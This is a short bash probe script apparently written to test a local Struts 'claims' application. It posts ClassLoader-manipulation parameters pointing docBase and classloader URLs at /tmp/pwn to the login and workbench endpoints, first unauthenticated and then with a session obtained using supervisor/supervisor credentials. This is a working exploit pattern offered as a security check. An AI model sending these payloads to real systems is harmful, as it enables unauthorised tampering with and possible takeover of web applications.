#!/usr/bin/env bash
# Probe the Struts form-population surface on a running instance.
set -u
BASE=http://localhost:8080/claims
JAR=$(mktemp)
echo "== login.do with ClassLoader-manipulation parameters (unauthenticated) =="
curl -s -o /dev/null -w "status=%{http_code}\n" -c "$JAR" \
  -d 'username=supervisor' -d 'password=supervisor' \
  -d 'class.classLoader.resources.dirContext.docBase=/tmp/pwn' \
  -d 'class.classLoader.URLs[0]=file:/tmp/pwn' \
  "$BASE/login.do"
echo "== authenticated workbench post with the same parameters =="
curl -s -o /dev/null -w "status=%{http_code}\n" -b "$JAR" \
  -d 'claimId=1' -d 'class.classLoader.resources.dirContext.docBase=/tmp/pwn' \
  "$BASE/workbench/view.do"
rm -f "$JAR"
